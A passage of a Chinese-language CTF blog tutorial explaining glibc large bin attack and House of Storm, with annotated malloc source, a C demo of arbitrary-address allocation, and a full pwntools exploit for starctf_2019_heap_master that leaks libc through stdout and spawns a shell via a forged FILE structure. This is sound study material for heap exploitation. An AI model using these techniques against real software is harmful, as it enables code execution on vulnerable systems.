bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">            <span class="comment">//将victem从unsortedbin中移出来，这里是unsortedbin的核心</span></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)<span class="comment">//判断当前操作(victim)的size是否和我们申请的chunk的size一样</span></span><br><span class="line">            &#123;<span class="comment">//house of strom</span></span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;<span class="comment">//如果一样直接返回</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))<span class="comment">//如果这个size是smallbin中的则放入smallbin中</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span><span class="comment">//否则就会放入largebin中//****largebin****///</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);<span class="comment">//根据size获取index</span></span><br><span class="line">              bck = bin_at (av, victim_index);<span class="comment">//bck是获取对应bin的地址，如：main_arena+1096处</span></span><br><span class="line">              fwd = bck-&gt;fd;<span class="comment">//fwd是largebin中最大的那个chunk的头节点</span></span><br><span class="line">              </span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)<span class="comment">//这个是判断当前bin中有没有chunk</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                      <span class="comment">//判断当前操作的chunk的size是不是小于当前bin中最小的size</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                          <span class="comment">//判断当前操作的chunk的size是不是小于当前bin中最大的size</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                          <span class="comment">//判断当前操作的chunk的size是不是等于当前bin中最大的size</span></span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;<span class="comment">//这是largebin_attack的核心</span></span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<ul>
<li>首先保证largebin中有一个chunk(size&gt;0x400)</li>
<li>unsortedbin中有一个比较大的chunk(size&gt;当前laregbin中已有的chunk)</li>
</ul>
<p>然后就可以到达这个分支。</p>
<p><strong>原因：将chunk从unsortedbin中插入到largebin中缺少一些检查</strong></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>2.23 ~ 2.29版本中largebin attack的利用点，在2.30及以后的版本中，加入了双链表检测，所以在libc2.30及以后，该处的largebin attack无法使用了。</p>
<h4 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h4><ul>
<li>构造2个堆：1个大小为unsorted bin范围的chunk，比如0x100，1个大小为large bin范围的，比如0x410，中间再加上其他堆用于隔离防止合并。</li>
</ul>
<h4 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h4><ul>
<li>free这两个chunk， frees顺序为 <code>free(0x410)</code>、<code>free(0x100)</code>，然后malloc(0x100)，这样可以保证在遍历到0x100这个合适的chunk时，能够优先从large bin范围的chunk，得到了一个large bin。</li>
</ul>
<h4 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h4><ul>
<li>构造2个堆：1个大小为unsorted bin范围的chunk，比如0x100，1个大小为large bin范围的但是比现在的large bin里的chunk要大，比如0x410 + 0x10 &#x3D; 0x420。</li>
</ul>
<h4 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h4><ul>
<li>free这两个chunk， free顺序为 <code>free(0x420)</code>、<code>free(0x100)</code>，此时，堆布局为large bin里一个0x410的chunk，unsorted bin里一个0x420的未归位的large bin，并且未归位的这个0x420的chunk与0x410的large bin属于同一个index。</li>
</ul>
<h4 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h4><ul>
<li>UAF或其他漏洞，控制large bin里那个chunk的bk和bk_nexsize。</li>
</ul>
<h4 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h4><ul>
<li>malloc(0x100)，使得malloc遍历unsorted bin，将0x420的chunk放入large bin，发生large bin attack。</li>
</ul>
<h2 id="Large-bin-attack的利用"><a href="#Large-bin-attack的利用" class="headerlink" title="Large bin attack的利用"></a>Large bin attack的利用</h2><h3 id="结合IO-FILE-hijack"><a href="#结合IO-FILE-hijack" class="headerlink" title="结合IO_FILE hijack"></a>结合IO_FILE hijack</h3><ul>
<li>利用large bin attack的任意地址写漏洞特性，错误地将IO 2 1 stdout内部的<code>_IO_write_base</code>修改为0，使得程序调用puts等函数时，能够影响泄露出libc地址，这也就是劫持了stdout。</li>
</ul>
<h3 id="House-of-orange"><a href="#House-of-orange" class="headerlink" title="House of orange"></a>House of orange</h3><ul>
<li>传统的house of orange是利用unsorted bin attack将IO_list全写一个<code>main_arena + 88</code>地址，然后通过<code>chain_next</code>进行转移，而large bin attack更加方便，直接在IO_list全写上一个堆地址，进而伪造IO_FILE结构。</li>
</ul>
<h3 id="Hijack-global-fastmax"><a href="#Hijack-global-fastmax" class="headerlink" title="Hijack global_fastmax"></a>Hijack global_fastmax</h3><ul>
<li>通过large bin attack将<code>global_max_fast</code>修改为一个堆地址，导致free任何chunk，都将放入fastbin，从而利用fastbin attack达到任意地址分配。</li>
</ul>
<h3 id="House-of-strom"><a href="#House-of-strom" class="headerlink" title="House of strom"></a>House of strom</h3><p>理解了large bin attack，接下来，我们就可以来看house of strom了，house of strom可以实现任意地址分配，看看前面的这道题，我们是将一个合法的unsorted bin chunk链接到unsorted bin里未归位的large bin chunk的bk处，假设，我们将一个任意地址比如addr链接到unsorted bin里未归位的large bin chunk的bk处，然后执行large bin attack会发生什么。</p>
<p>那么，在large bin attack阶段不会有问题，只是接下来，继续遍历，取到我们链接上的这个chunk时，检查其size，不符合要求然后崩溃。我们可以利用前面的large bin attack，先将addr处的size的位置写上一个堆指针，我们可以利用错位法，这样，在size处留下了chunk地址值的第6字节数据，在开启PIE的情况下，一般为0x55为0x56，这样，我们malloc(0x40)，遍历到第一个未归位的large bin chunk时，发生large bin attack，接下来遍历到后面这个任意地址的chunk时，发现size符合要求，直接返回给用户，就可以成功把这个任意地址的空间申请过来。</p>
<h2 id="House-of-strom-1"><a href="#House-of-strom-1" class="headerlink" title="House of strom"></a>House of strom</h2><h3 id="House-of-strom原理"><a href="#House-of-strom原理" class="headerlink" title="House of strom原理"></a>House of strom原理</h3><p>该利用手法适用于glibc 2.28及以下的版本，因为unsorted bin attack在glibc 2.29中已失效。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里是关于largebin_attack的重点</span></span><br><span class="line">  <span class="keyword">for</span> (;; )<span class="comment">//遍历unsortedbin</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<span class="comment">//从bk开始遍历</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);<span class="comment">//获得当前要操作的chunk的size</span></span><br><span class="line">......</span><br><span class="line"><span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line"><span class="comment">//只进行检查了chunk的size == nb（nb申请的大小）</span></span><br><span class="line">&#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">    <span class="comment">//这里会直接返回p,p就是victim,victim = unsorted_chunks (av)-&gt;bk</span></span><br><span class="line">    <span class="comment">//victim又是unsorted_chunks的bk</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在，我们将house of strom里的步骤改一下，将0x100的unsorted bin转换成任意地址，即通过修改unsorted bin里未归位的large bin的bk指针指向任意地址addr，然后修改large bin里有的那个chunk的bk_nexsize为addr - 0x18 - 0x5（错位写入堆地址）。</p>
<p>通过malloc(0x40)即可分配到任意地址addr + 0x10处，这里是因为large bin attack里victim-&gt;bk_nexsize-&gt;fd_nexsize &#x3D; victim即(addr - 0x18 - 0x5) + 0x18 &#x3D; victim，即addr - 0x5 &#x3D; victim。在PIE下，victim地址一般为0x55或0x56开头，并且有6字节有效数据，此时，即相当于*(char *)(addr - 0x5 + 0x5) &#x3D; (addr &gt;&gt; 40) &amp; 0xFF，也就是在addr处写入了0x55或0x56，可以用来充当unsorted bin的size，这样，接下来继续回溯unsorted bin时，仅检查size是否符合请求的一样，一样就可以直接返回这个地址，实现任意地址分配。</p>
<h3 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//gap</span></span><br><span class="line">   <span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x10</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//gap</span></span><br><span class="line">   <span class="built_in">free</span>(p1);</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span class="comment">//将p1放入large bin</span></span><br><span class="line">   <span class="built_in">free</span>(p2); <span class="comment">//p2放入unsorted bin   </span></span><br><span class="line">   <span class="type">size_t</span> addr = (<span class="type">size_t</span>)(buf - <span class="number">0x10</span>);</span><br><span class="line">   *(<span class="type">size_t</span> *)(p1+<span class="number">0x8</span>) = addr + <span class="number">0x8</span>; <span class="comment">//修改large bin的bk</span></span><br><span class="line">   *(<span class="type">size_t</span> *)(p1 + <span class="number">0x18</span>) = addr - <span class="number">0x18</span> - <span class="number">0x5</span>; <span class="comment">//修改large bin的bk_nextsize</span></span><br><span class="line">   *(<span class="type">size_t</span> *)(p2 + <span class="number">0x8</span>) = addr;<span class="comment">//修改unsorted bin的bk</span></span><br><span class="line">   <span class="type">char</span> *p = <span class="built_in">malloc</span>(<span class="number">0x48</span>); <span class="comment">//申请到addr处</span></span><br><span class="line">   <span class="built_in">strcpy</span>(p,<span class="string">&quot;hello,welcome to pwn world\n&quot;</span>);</span><br><span class="line">   write(<span class="number">1</span>,buf,<span class="built_in">strlen</span>(buf));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="starctf-2019-heap-master"><a href="#starctf-2019-heap-master" class="headerlink" title="starctf_2019_heap_master"></a>starctf_2019_heap_master</h3><p>ubuntu16.04，glibc2.23&#x2F;glibc2.25</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ctf@70b53f87c516:~/pwn/实验脚本$ checksec starctf_2019_heap_master</span><br><span class="line">[*] <span class="string">&#x27;/home/ctf/pwn/实验脚本/starctf_2019_heap_master&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<h4 id="ida静态分析"><a href="#ida静态分析" class="headerlink" title="ida静态分析"></a>ida静态分析</h4><h5 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h5><p><img data-src="/../images/image-20250327214259281.png" alt="image-20250327214259281"></p>
<h5 id="prog-init"><a href="#prog-init" class="headerlink" title="prog_init()"></a>prog_init()</h5><p><img data-src="/../images/image-20250327214321585.png" alt="image-20250327214321585"></p>
<h5 id="add"><a href="#add" class="headerlink" title="add()"></a>add()</h5><p><img data-src="/../images/image-20250327214413213.png" alt="image-20250327214413213"></p>
<p>add()函数，只能malloc()，而不存堆指针</p>
<h5 id="delete"><a href="#delete" class="headerlink" title="delete()"></a>delete()</h5><p><img data-src="/../images/image-20250327214449386.png" alt="image-20250327214449386"></p>
<p>delete()函数，只能free heap_base范围内的</p>
<h5 id="edit"><a href="#edit" class="headerlink" title="edit()"></a>edit()</h5><p><img data-src="/../images/image-20250327214738926.png" alt="image-20250327214738926"></p>
<p>edit()函数也是只能改heap_base范围内的</p>
<p>程序功能上看：</p>
<ul>
<li>程序不能控制add()中malloc()出来的chunk</li>
<li>edit()和delete()只能在heap_base范围内</li>
<li>漏洞点在于可以delete()后继续编辑堆，uaf</li>
</ul>
<p><strong>重点关注的是：这道题的目的之一是让我们在heap_base的范围上去布局堆内存</strong></p>
<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>程序没有show功能，并且开启了PIE，第一步应该该泄露地址，程序里有调用puts等函数，因而可以hijack IO_2_1_stdout，这里可以用unsorted bin attack或者large bin attack，如果用了unsorted bin attack，后续的利用将无法继续，因为unsorted bin被破坏了，因此，我们选择large bin attack来攻击IO_2_1_stdout。</p>
<p>对于篡改IO_2_1_stdout来泄露数据，flags有要求，必须得经过这两个if，才能到达后方调用syswrite将_IO_write_base与_IO_write_ptr之间的数据信息泄露出来，这就要求flags的<strong>低1字节的低4位不能为8</strong>，<strong>第二字节的低4位必须要为8</strong>，也就是说，我们的unsorted bin chunk地址末尾地址应该为0x800这样。</p>
<p>从以上分析来看，large bin attack攻击IO_2_1_stdout是最为合适的，因为需要修改IO_2_1_stdout里的两处内容，即flags和_IO_write_base。</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>一次运行可能会不成功，这是因为hijack_stdout时需要爆破一个字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./starctf_2019_heap_master&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">	p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(file_name)</span><br><span class="line">p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">_IO_2_1_stdout_s = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address, data      :log.success(<span class="string">&#x27;%s:   &#x27;</span> % (address) + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里用lambda表达式我的机器会过不了交互</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">offset,size,content</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;offset:&#x27;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   p.sendafter(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">offset</span>):</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">   p.sendlineafter(<span class="string">b&#x27;offset:&#x27;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#伪造8个chunk</span></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0x420</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">edit(<span class="number">0x440</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0x880</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x431</span>) + <span class="string">b&#x27;c&#x27;</span>*<span class="number">0xF0</span>)</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">edit(<span class="number">0xCB0</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line">edit(<span class="number">0xCD0</span>,<span class="number">0x90</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#6</span></span><br><span class="line">edit(<span class="number">0xD60</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#7</span></span><br><span class="line">edit(<span class="number">0xD80</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;g&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#释放0，进入unsortedbin中</span></span><br><span class="line">delete(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#malloc_consolidate将0放入large bin</span></span><br><span class="line">add(<span class="number">0x430</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接下来，为了在bk和bk_nextsize处留下libc指针，我们要继续伪造unsorted bin</span></span><br><span class="line"><span class="comment">#在bk_nextsize处留下libc指针</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="number">0xF0</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span> + (p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>) * <span class="number">3</span>)</span><br><span class="line">delete(<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment">#把unsorted bin申请掉</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#在bk留下libc指针</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(<span class="number">0xC1</span>))</span><br><span class="line">delete(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0xB0</span>) <span class="comment">#把unsorted bin申请掉</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改large bin的bk，指向stdout</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="number">0xA</span>,p64(<span class="number">0</span>) + p16((<span class="number">0x2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s - <span class="number">0x10</span>) &amp; <span class="number">0xFFF</span>)))</span><br><span class="line"><span class="comment">#修改large bin的bk_nextsize，指向_IO_write_base</span></span><br><span class="line">edit(<span class="number">0x20</span>,<span class="number">0xA</span>,p64(<span class="number">0</span>) + p16((<span class="number">0x2</span> &lt;&lt; <span class="number">12</span>) + ((_IO_2_1_stdout_s + <span class="number">0x20</span> - <span class="number">0x20</span> - <span class="number">0x7</span>) &amp; <span class="number">0xFFF</span>)))</span><br><span class="line"><span class="comment">#在这里可以理解一下house of storm的任意地址写是堆glibc源码中哪个位置写</span></span><br><span class="line"><span class="comment">#恢复large bin的头size</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x10</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x421</span>))</span><br><span class="line"><span class="comment">#3放入unsorted bin，3属于未归位的large bin</span></span><br><span class="line">delete(<span class="number">0x890</span>)</span><br><span class="line"><span class="comment">#0x90的堆放入unsorted bin    </span></span><br><span class="line">delete(<span class="number">0xCE0</span>)</span><br><span class="line"><span class="comment">#遍历unsorted bin时发生large bin attack，攻击io_2_1_stdout</span></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(p.recv(<span class="number">24</span>))</span><br><span class="line">data = p.recv(<span class="number">6</span>)</span><br><span class="line">libc_base = uu64(data) - libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">_IO_list_all_addr = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">_IO_str_finish_ptr_addr = libc_base + <span class="number">0x3c34b0</span></span><br><span class="line">lg(<span class="string">&#x27;_IO_list_all_addr&#x27;</span>,_IO_list_all_addr)</span><br><span class="line">lg(<span class="string">&#x27;system_addr&#x27;</span>,system_addr)</span><br><span class="line">lg(<span class="string">&#x27;binsh_addr&#x27;</span>,binsh_addr)</span><br><span class="line">lg(<span class="string">&#x27;_IO_str_finish_ptr_addr&#x27;</span>,_IO_str_finish_ptr_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#house of orange glibc2.24-2.27</span></span><br><span class="line">fake_file = p64(<span class="number">0</span>) + p64(<span class="number">0x61</span>) <span class="comment">#unsorted bin attack</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all_addr - <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(binsh_addr)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xC0</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line"><span class="comment">#vtable -&gt; _IO_strn_jumps - 0x8</span></span><br><span class="line">fake_file += p64(_IO_str_finish_ptr_addr - <span class="number">0x18</span>) <span class="comment">#vtable</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)</span><br><span class="line">fake_file += p64(system_addr)   </span><br><span class="line">delete(<span class="number">0xCE0</span>) <span class="comment">#unsorted bin</span></span><br><span class="line">edit(<span class="number">0xCD0</span>,<span class="built_in">len</span>(fake_file),fake_file) <span class="comment">#修改unsorted bin内容</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<p>打本地的时候<code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></p>
